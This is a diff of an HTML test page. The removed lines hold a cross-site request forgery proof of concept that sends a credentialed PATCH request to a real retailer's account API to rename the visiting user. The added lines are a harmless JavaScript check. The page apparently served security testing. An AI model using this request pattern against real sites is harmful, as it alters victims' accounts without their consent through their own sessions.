@@ -1,30 +1,11 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>CSRF Test Page</h2>
+    <h2>Test JS</h2>
     <script>
-      console.log("Tentative de CSRF…");
-
-      fetch("https://accounts.decathlon.com/myaccount_bff/members/me/profile/identity", {
-        method: "PATCH",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ lastname: "IkramCSRF" })
-      })
-      .then(res => {
-        console.log("Code HTTP:", res.status);
-        return res.text();
-      })
-      .then(data => {
-        console.log("Réponse brute:", data);
-        alert("Requête terminée, voir console.");
-      })
-      .catch(err => {
-        console.error("Erreur CORS ou réseau :", err);
-        alert("Erreur. Voir console.");
-      });
+      alert("JS exécuté !");
+      console.log("JS est bien exécuté !");
+      document.body.style.background = "lightgreen";
     </script>
   </body>
 </html>
